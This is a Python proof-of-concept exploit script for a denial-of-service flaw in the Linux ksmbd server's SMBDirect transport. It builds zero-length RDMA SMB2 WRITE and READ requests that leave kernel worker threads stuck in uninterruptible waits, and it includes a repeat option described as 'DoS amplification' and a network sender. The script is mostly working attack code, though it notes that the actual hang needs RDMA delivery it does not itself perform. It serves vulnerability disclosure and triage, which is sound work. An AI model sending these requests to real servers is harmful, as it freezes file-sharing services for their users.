#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
#
# poc_smbdirect_zero_length_dos.py
#
# Proof-of-Concept for CVE-2026-XXXX  (ksmbd / smbdirect)
#   "smbdirect: reject zero-length RDMA read/write transfers"
#
# Impact: an AUTHENTICATED remote client that reaches ksmbd over the
# SMBDirect (RDMA) transport can drive a ksmbd-io work item into an
# unrecoverable wait_for_completion(), permanently freezing that
# connection's request processing. Repeating the attack exhausts the
# shared ksmbd-io workqueue -> deterministic, unbounded DoS.
#
# Trigger shape (see fs/smb/server/smb2pdu.c smb2_write / smb2_read):
#
#   SMB2 WRITE
#     Channel           = SMB2_CHANNEL_RDMA_V1   (0x00000001) or
#                         SMB2_CHANNEL_RDMA_V1_INVALIDATE (0x00000002)
#     Length            = 0
#     DataOffset        = 0
#     RemainingBytes    = 0          <-- ksmbd uses this as the RDMA length
#     WriteChannelInfo  = >= 1 buffer descriptor (so ch_count >= 1)
#
#   SMB2 READ
#     Channel           = SMB2_CHANNEL_RDMA_V1(_INVALIDATE)
#     Length            = 0          <-- used directly as RDMA length
#     ReadChannelInfo   = >= 1 buffer descriptor
#
# Neither smb2_write() nor smb2_read() rejects length == 0 on the RDMA
# path, so smbdirect_connection_rdma_xmit() is called with buf_len == 0
# (on a ZERO_SIZE_PTR buffer). Its descriptor walk breaks immediately
# (desc_num == 0), no WR is posted, no CQE is produced, and:
#
#       msg = list_last_entry(&msg_list, ...);   /* empty list -> UB   */
#       wait_for_completion(&completion);        /* TASK_UNINTERRUPTIBLE */
#
# blocks forever. See the accompanying patch and README.
#
# ---------------------------------------------------------------------------
# HOW TO RUN
#
# This PoC operates at the SMB2 *request* layer. There are two ways to
# actually deliver the crafted frame over RDMA:
#
#  (A) Full SMBDirect (requires RDMA NIC + softiwarp/siw or mlx5_hw):
#        - Establish the SMBDirect connection (negotiate over TCP first,
#          then upgrade), and send the request built here inside an
#          SMBDirect data transfer PDU. A complete userspace SMBDirect
#          client is out of scope for a PoC; use the kernel C client
#          driver path described in the README ("Method 2") which is the
#          simplest end-to-end trigger on real hardware.
#
#  (B) Direct kernel-level injection (recommended for triage/QA):
#        - Boot a kernel with ksmbd + smbdirect + a loopback siw device,
#          mount the share over SMBDirect, and use an eBPF/kprobe hook
#          (or a one-line client patch) to force the WRITE/READ request
#          fields to the zero-length RDMA shape shown below.
#
# This script focuses on (1) building the exact malicious SMB2 WRITE and
# READ request bytes and (2) providing a TCP-based smoke harness that
# proves the *request* is well-formed and accepted by the parser up to
# the RDMA-channel dispatch point. The actual hang requires the RDMA
# transport, as the vulnerability lives under fs/smb/smbdirect/.
# ---------------------------------------------------------------------------

import argparse
import socket
import struct
import sys

# ---- SMB2 constants (subset) ------------------------------------------------

SMB2_MAGIC          = b"\xfeSMB"            # 0xFE 'S' 'M' 'B'
SMB2_NEGOTIATE       = 0x0000
SMB2_SESSION_SETUP   = 0x0001
SMB2_TREE_CONNECT    = 0x0003
SMB2_CREATE          = 0x0005
SMB2_WRITE           = 0x0009
SMB2_READ            = 0x0008
SMB2_CLOSE           = 0x0006

SMB2_FLAGS_SERVER_TO_REDIR = 0x00000001

# Channel values (smb2_write_req / smb2_read_req Channel field)
SMB2_CHANNEL_RDMA_V1            = 0x00000001
SMB2_CHANNEL_RDMA_V1_INVALIDATE = 0x00000002

# A single smbdirect_buffer_descriptor_v1 is 24 bytes:
#   offset : u64 (le)
#   token  : u32 (le)
#   length : u32 (le)
DESC_FMT = "<QII"
DESC_SIZE = struct.calcsize(DESC_FMT)        # 24

# Offsets of the variable fields inside smb2_write_req / smb2_read_req,
# measured from the start of the SMB2 header (the 64-byte hdr). These are
# used purely to build a *structurally correct* request so that ksmbd's
# PDU validators (smb2misc.c) accept it up to the RDMA-channel dispatch.
WRITE_REQ_FIXED_SIZE = 49                     # StructureSize of smb2_write_req
READ_REQ_FIXED_SIZE  = 49                     # StructureSize of smb2_read_req
HDR_SIZE             = 64


def le16(v): return struct.pack("<H", v & 0xFFFF)
def le32(v): return struct.pack("<I", v & 0xFFFFFFFF)
def le64(v): return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def smb2_hdr(command, flags, next_command, message_id, tree_id, session_id):
    """Build a 64-byte SMB2 transform header (credit charge etc. minimal)."""
    hdr = bytearray()
    hdr += SMB2_MAGIC                              # ProtocolId
    hdr += le16(HDR_SIZE)                          # StructureSize = 64
    hdr += le16(0)                                 # CreditCharge
    hdr += le32(0)                                 # (Status / reserved channel seq)
    hdr += le16(command)                           # Command
    hdr += le16(1)                                 # CreditRequest (grant 1)
    hdr += le32(flags)                             # Flags
    hdr += le32(next_command)                      # NextCommand
    hdr += le64(message_id)                        # MessageId
    hdr += le32(0)                                 # Reserved
    hdr += le32(tree_id)                           # TreeId
    hdr += le64(session_id)                        # SessionId
    hdr += b"\x00" * 16                            # Signature (placeholder)
    assert len(hdr) == HDR_SIZE
    return bytes(hdr)


def make_write_channel_info(token=0xDEADBEEF, length=0):
    """One buffer descriptor. length is the descriptor's own length field;
    it does NOT need to match the (zero) transfer length to pass
    smb2_set_remote_key_for_rdma(), which only requires ch_count >= 1."""
    desc = struct.pack(DESC_FMT, 0, token, length)        # offset=0
    return desc


def build_malicious_write(tree_id, session_id, message_id, fid_volatile,
                          fid_persistent, channel=SMB2_CHANNEL_RDMA_V1):
    """Build the exact malicious SMB2 WRITE that triggers the hang.

    Key fields that make it bypass every ksmbd check yet reach the RDMA
    xmit path with length == 0:
        Length          = 0   (required by smb2_write RDMA branch)
        DataOffset      = 0   (required by smb2_write RDMA branch)
        RemainingBytes  = 0   <-- becomes the RDMA transfer length
        Channel         = RDMA_V1(_INVALIDATE)
        WriteChannelInfo = 1 descriptor (so ch_count >= 1)

    struct smb2_write_req fixed part (excl. hdr and Buffer[]):
        u16 StructureSize, u16 DataOffset, u32 Length, u64 Offset,
        u64 PersistentFileId, u64 VolatileFileId, u32 Channel,
        u32 RemainingBytes, u16 WriteChannelInfoOffset,
        u16 WriteChannelInfoLength, u32 Flags   = 48 bytes
    """
    channel_info = make_write_channel_info()
    # ChannelInfo immediately follows the 48-byte fixed part (+1 Buffer byte
    # implied by StructureSize=49). Place it right after the fixed body.
    channel_info_off = HDR_SIZE + 48 + 1

    body = bytearray()
    body += le16(WRITE_REQ_FIXED_SIZE)             # StructureSize = 49
    body += le16(0)                                # DataOffset = 0  *** trigger ***
    body += le32(0)                                # Length = 0      *** trigger ***
    body += le64(0)                                # Offset (file)
    body += le64(fid_persistent)                   # PersistentFileId (u64)
    body += le64(fid_volatile)                     # VolatileFileId   (u64)
    body += le32(channel)                          # Channel = RDMA_V1 ***
    body += le32(0)                                # RemainingBytes = 0 *** trigger ***
    body += le16(channel_info_off)                 # WriteChannelInfoOffset
    body += le16(len(channel_info))                # WriteChannelInfoLength
    body += le32(0)                                # Flags
    assert len(body) == 48, len(body)

    # Add the single implied Buffer byte, then the channel-info descriptor.
    body += b"\x00"
    pdu = smb2_hdr(SMB2_WRITE, 0, 0, message_id, tree_id, session_id) \
          + bytes(body) + channel_info
    return pdu


def build_malicious_read(tree_id, session_id, message_id, fid_volatile,
                         fid_persistent, channel=SMB2_CHANNEL_RDMA_V1):
    """Build the exact malicious SMB2 READ that triggers the hang.

    smb2_read uses req->Length directly as the RDMA transfer length, so
        Length = 0
    with an RDMA channel reaches smbdirect_connection_rdma_xmit(0).

    struct smb2_read_req fixed part (excl. hdr and Buffer[]):
        u16 StructureSize, u8 Padding, u8 Flags, u32 Length, u64 Offset,
        u64 PersistentFileId, u64 VolatileFileId, u32 MinimumCount,
        u32 Channel, u32 RemainingBytes, u16 ReadChannelInfoOffset,
        u16 ReadChannelInfoLength                   = 48 bytes
    """
    channel_info = make_write_channel_info()
    channel_info_off = HDR_SIZE + 48 + 1

    body = bytearray()
    body += le16(READ_REQ_FIXED_SIZE)              # StructureSize = 49
    body += bytes([channel_info_off & 0xFF])       # Padding (1 byte)
    body += bytes([0])                             # Flags (1 byte)
    body += le32(0)                                # Length = 0      *** trigger ***
    body += le64(0)                                # Offset (file)
    body += le64(fid_persistent)                   # PersistentFileId (u64)
    body += le64(fid_volatile)                     # VolatileFileId   (u64)
    body += le32(0)                                # MinimumCount
    body += le32(channel)                          # Channel = RDMA_V1 ***
    body += le32(0)                                # RemainingBytes
    body += le16(channel_info_off)                 # ReadChannelInfoOffset
    body += le16(len(channel_info))                # ReadChannelInfoLength
    assert len(body) == 48, len(body)

    body += b"\x00"                                # implied Buffer byte
    pdu = smb2_hdr(SMB2_READ, 0, 0, message_id, tree_id, session_id) \
          + bytes(body) + channel_info
    return pdu


def netbios_frame(pdu):
    """Wrap an SMB2 PDU in the 4-byte RFC1002 length header (TCP)."""
    return le32(len(pdu)) + pdu


def smoke_send(host, port, pdu, label):
    """TCP smoke harness: proves the request bytes are structurally
    accepted by the SMB2 parser up to dispatch. It is NOT the hang itself
    (the hang requires the RDMA transport); it confirms there is no early
    framing rejection that would short-circuit the trigger on RDMA too."""
    print(f"[*] smoke ({label}): connecting {host}:{port} (TCP)")
    try:
        s = socket.create_connection((host, port), timeout=5)
        s.sendall(netbios_frame(pdu))
        try:
            resp = s.recv(4)
            if len(resp) == 4:
                plen = struct.unpack("<I", resp)[0]
                print(f"[+] TCP framing accepted; server returned a "
                      f"{plen}-byte PDU envelope (parser reached dispatch).")
        except socket.timeout:
            print("[!] no TCP response in 5s (expected: this is a raw PDU; "
                  "ksmbd needs a full negotiate/session first).")
        s.close()
    except OSError as e:
        print(f"[!] smoke connect failed: {e}")
    print("[*] NOTE: the actual hang is reproduced only when the same "
          "request is delivered over SMBDirect (RDMA). See README.")


def main():
    ap = argparse.ArgumentParser(
        description="PoC: ksmbd/smbdirect zero-length RDMA R/W DoS")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=445)
    ap.add_argument("--op", choices=["write", "read", "both"], default="write")
    ap.add_argument("--channel", choices=["v1", "v1_invalidate"],
                    default="v1")
    ap.add_argument("--repeat", type=int, default=1,
                    help="number of malicious requests to stage (DoS amplification)")
    ap.add_argument("--emit-only", action="store_true",
                    help="just print the crafted request bytes; no network")
    args = ap.parse_args()

    ch = (SMB2_CHANNEL_RDMA_V1 if args.channel == "v1"
          else SMB2_CHANNEL_RDMA_V1_INVALIDATE)

    # Placeholder IDs; in a real session these come from SESSION_SETUP /
    # TREE_CONNECT / CREATE. The crafted bytes are what matter for the
    # trigger; IDs only gate *authorization*, not the vulnerability.
    SESSION_ID = 0x00000000FFFFFFFF
    TREE_ID    = 0x00000001
    FID_VOL    = 0x00000000AAAAAAAA
    FID_PERS   = 0x00000000BBBBBBBB

    pdus = []
    for i in range(args.repeat):
        mid = 0x100 + i
        if args.op in ("write", "both"):
            pdus.append(("WRITE", build_malicious_write(
                TREE_ID, SESSION_ID, mid, FID_VOL, FID_PERS, ch)))
        if args.op in ("read", "both"):
            pdus.append(("READ", build_malicious_read(
                TREE_ID, SESSION_ID, mid, FID_VOL, FID_PERS, ch)))

    for label, pdu in pdus:
        print(f"\n=== crafted {label} ({len(pdu)} bytes), channel={args.channel} ===")
        if args.emit_only:
            print(pdu.hex())
            continue
        smoke_send(args.host, args.port, pdu, label)

    print("\n[*] If delivered over SMBDirect to an unpatched ksmbd, the target "
          "connection's request processing freezes (D state in ksmbd-io). "
          "Monitor with: ps -eo pid,stat,comm | grep ksmbd  /  cat /proc/<pid>/stack")


if __name__ == "__main__":
    main()
